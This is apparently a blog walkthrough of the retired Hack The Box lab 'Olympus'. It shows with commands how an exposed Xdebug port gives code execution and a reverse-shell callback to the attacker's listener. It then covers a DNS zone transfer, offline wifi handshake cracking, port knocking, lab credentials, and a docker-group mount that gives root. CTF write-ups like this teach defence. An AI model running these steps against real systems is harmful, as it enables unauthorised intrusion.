---
layout: post
title: "Twelve Labors for a Shell"
subtitle: "HTB Olympus, where a debug port left open to the world becomes a relay race through containers, a cracked wifi capture, a knock at a sealed door, and a docker group that owns the host"
date: 2018-09-29 12:00:00 +0000
description: "A debug port wired to the open internet kicks off a relay race through three containers, a cracked wifi handshake, and a docker group that quietly owns the whole machine."
image: /assets/og/twelve-labors-for-a-shell.png
tags: [hackthebox, writeup]
---

Olympus is a relay race dressed as a Greek myth. There is no single break here, no one bug that hands you everything. Instead the box makes you run a baton from hand to hand, container to container, each leg unlocked by a secret you stole on the leg before. It opens with a debugging tool that someone wired straight to the public internet, the kind of thing meant to live on a developer's laptop and nowhere else. From that first foothold the box turns into a scavenger hunt: a wifi handshake you have to crack offline, a riddle hidden in a DNS record, a door that only opens if you knock on three other doors in the right order first. And at the very end, after all that mythology, root is just a boring misconfiguration that has nothing to do with any of it. The whole climb is a lesson in how a system is only as locked as its weakest container, and how a single careless group membership can flatten every wall you spent hours climbing.

```
        O L Y M P U S
        =============
        :80   "i'm a debug port. tell me what to run."
                       |
                       v
        crete  ─► dns riddle ─► wifi .cap ─► crack it
                       |
                       v
        olympia ─► port-knock 3456·8234·62431 ─► door opens
                       |
                       v
        hades  ─► you're in the docker group
                       |
                       v
        docker mounts the whole host. root was never guarded.
                                                            神
```

## 0x01 · the debug port left on

A scan tells a strange story. SSH on 22 shows as `filtered`, meaning the door is there but something is swallowing every knock. SSH answers on the odd port 2222 instead. DNS is up on 53. And a web server sits on 80.

```
PORT     STATE    SERVICE
22/tcp   filtered ssh
53/tcp   open     domain
80/tcp   open     http
2222/tcp open     ssh
```

The web page itself is nearly empty, so the interesting part is in the response headers, where one line does not belong.

```
$ curl -sI http://10.10.10.83/
HTTP/1.1 200 OK
Server: Apache/2.4.18
Xdebug: 2.5.5
```

`Xdebug` is a development tool. It lets a programmer pause their PHP code mid-run, inspect variables, and step through line by line, which is wonderful on the laptop where you write the code and a catastrophe on a server facing the internet. When Xdebug is in remote mode it does not wait for you to connect to it. It reaches out and connects to *you*, to whatever machine the code thinks is the developer, and then it cheerfully accepts commands. Think of it like a delivery driver who, instead of waiting at a depot for instructions, has been told to phone home to a number written on a sticky note. Whoever owns that number gets to direct the truck.

## 0x02 · making the truck phone home

The trigger is almost insultingly small. Xdebug starts a debug session when it sees a cookie named `XDEBUG_SESSION`, and the address it dials back to is the address of whoever sent the request. So you stand up a listener on port 9000, the protocol's default, send one request carrying that cookie, and the server connects to you.

```
$ nc -lvnp 9000 &
$ curl http://10.10.10.83/ -H 'Cookie: XDEBUG_SESSION=iceberg'
connect to [10.10.14.4] from (UNKNOWN) [10.10.10.83]
<init ... xdebug:language_version="7.0.30" ...>
```

What flows over that connection is DBGp, the debugger wire protocol, and it includes an `eval` command. An evaluator that runs whatever expression you hand it is a remote code execution engine with a friendlier name. You feed it a PHP `eval` carrying your payload, and the server runs it.

```
$ eval -- <base64 of: system("id")>
www-data
```

Spend that capability on a real callback rather than a one-off command.

```
eval -- [ base64 PHP that spawns a bash reverse shell to 10.10.14.4 on 443 ]
```

The shell lands as `www-data`, but `hostname` says you are in a container named `crete`, sitting on a private `172.20.0.x` network. You are inside the front gate, not the city.

## 0x03 · the riddle in the dns

Two threads to pull from `crete`. The DNS server on 53 is the loud one. Old DNS servers will, if asked nicely and configured carelessly, hand you their entire zone in one shot, a feature called a zone transfer meant for syncing backup servers that becomes a full directory dump for anyone who asks.

```
$ dig axfr @10.10.10.83 ctfolympus.htb
...
ctfolympus.htb. IN TXT "prometheus, open a temporal portal to Hades
   (3456 8234 62431) and St34l_th3_F1re!"
```

That TXT record is the whole back half of the box written as a riddle. The three numbers are a knock sequence. The phrase `St34l_th3_F1re!` is a password. Pocket both. They unlock a door you have not even found yet, which is the point of writing them down now.

## 0x04 · cracking the handshake

The other thread is in `zeus`'s home directory, where a wifi auditing toolkit left a capture file behind.

```
www-data@crete:/home/zeus/airgeddon/captured$ ls
captured.cap
```

A `.cap` file from a wifi attack holds a handshake, the brief encrypted greeting a device and a router exchange when they connect. That handshake does not contain the password, but it contains enough math that you can sit offline and guess passwords until one fits, never touching the real network. Picture a sealed envelope that does not hold the key but does hold a lock you can test keys against, quietly, in your own basement, as many times as you like. That is offline cracking, and it is why a weak wifi password is fatal even when the attacker is nowhere near the building.

```
$ aircrack-ng -w /usr/share/wordlists/rockyou.txt captured.cap
   [00:00:14] KEY FOUND! [ flightoficarus ]
```

The capture also exposes the network name, `Too_cl0se_to_th3_Sun`. Now you have a username and password pair waiting to be tried somewhere, and the box has been kind enough to leave an SSH port on 2222.

## 0x05 · the second container

That SSH on 2222 takes the wifi credentials and drops you into a different container called `olympia`.

```
$ ssh icarus@10.10.10.83 -p 2222
icarus@10.10.10.83's password: Too_cl0se_to_th3_Sun
icarus@olympia:~$ id
uid=1000(icarus)
```

You are deeper now, but `icarus` is a dead end on its own. The real prize is that from here the riddle from the DNS record finally has a lock to fit. Remember `filtered` SSH on port 22 from the very first scan. That is port knocking. The door is welded shut until you tap a precise sequence of other ports in order, and only then does the firewall briefly open 22. Think of it like a speakeasy with no handle, where the door only opens if you rap on three specific bricks in the wall in the right sequence. Get the order wrong and the wall just stays a wall.

## 0x06 · knocking on a welded door

The TXT record handed you the sequence: 3456, then 8234, then 62431. Send a packet at each, in order, and the firewall relents.

```
$ for p in 3456 8234 62431; do nmap -Pn --max-retries 0 -p $p 10.10.10.83; done
$ nmap -p22 10.10.10.83
22/tcp open  ssh
```

The welded door is open. Now the password from the same record, `St34l_th3_F1re!`, finally has a user to belong to. `prometheus` was named right there in the riddle.

```
$ ssh prometheus@10.10.10.83
prometheus@10.10.10.83's password: St34l_th3_F1re!
prometheus@olympus:~$ cat user.txt
████████████████████████████████
```

Three containers, three borrowed secrets, and the user flag. Every leg of that race handed you the key to the next.

## 0x07 · the group that owns the machine

After all that mythology, root is mundane, which is so often how it goes. Check what groups `prometheus` belongs to.

```
prometheus@olympus:~$ id
uid=1000(prometheus) ... groups=...,999(docker)
```

That single word `docker` is the whole endgame. Membership in the docker group is, in practice, the same as being root, and almost nobody who grants it understands that. Docker runs as root in the background, and the group lets you tell it what to do without a password. So you ask it to start a container that mounts the real machine's entire disk inside itself.

```
prometheus@olympus:~$ docker run -v /:/hostOS -i -t rodhes bash
root@container:/# cat /hostOS/root/root.txt
████████████████████████████████
```

Think of it like a valet who is allowed to drive any car in the lot. You hand him a slip that says "park this car, and by the way mount the owner's house inside the trunk." He has the keys to do exactly that, because the whole point of his job is that he has the keys. The `-v /:/hostOS` flag mounts the host's root filesystem into a container you control as root, and from there every file on the actual machine is yours to read or rewrite.

## 0x08 · the honest caveat

It is tempting to remember Olympus for its set pieces, the wifi crack and the port knock and the DNS riddle, and to file them as clever tricks. They are clever. But they are not the lesson. The lesson is the first port and the last group, the two boring bookends around all the mythology.

The first port is the failure that should never have happened: a debugging tool, built for a trusted local machine, exposed to the entire internet. Xdebug was doing precisely what it was designed to do. It dialed home and accepted commands, because that is its job on a developer's laptop where home is the developer. Nobody attacked Xdebug. Someone simply ran a workshop tool in a public square. The same shape repeats everywhere: a database admin console, a metrics endpoint, a cloud metadata service, all perfectly safe in the room they were built for and lethal the moment that room has a window onto the street.

The last group is the quieter sin. The docker group flattened every wall the box spent six sections building. All that pivoting, all those stolen secrets, and root came down to a single line in a group file that a tired administrator added one afternoon so they would not have to type a password. That convenience is indistinguishable from a backdoor. Containers feel like walls, and they are real walls, but a host that hands a low user the keys to the container engine has quietly drilled a tunnel under every one of them.

## 0x09 · outro

```
the debug port phoned a stranger and did what it was told.
the wifi password fell apart in a basement, far from the router.
the door opened because someone knew which bricks to tap.
and root was never guarded at all. it was given away in a group.

every wall on this box was real. one careless membership went under them all.

shut the debug port. mind the group file. wear black.

                                                            EOF
```

---

*HTB: Olympus, retired 22 Sep 2018. A medium Linux box that runs a relay race through three containers and lands on the oldest privilege escalation in the modern stack: a user in the docker group is a user with the keys to the house.*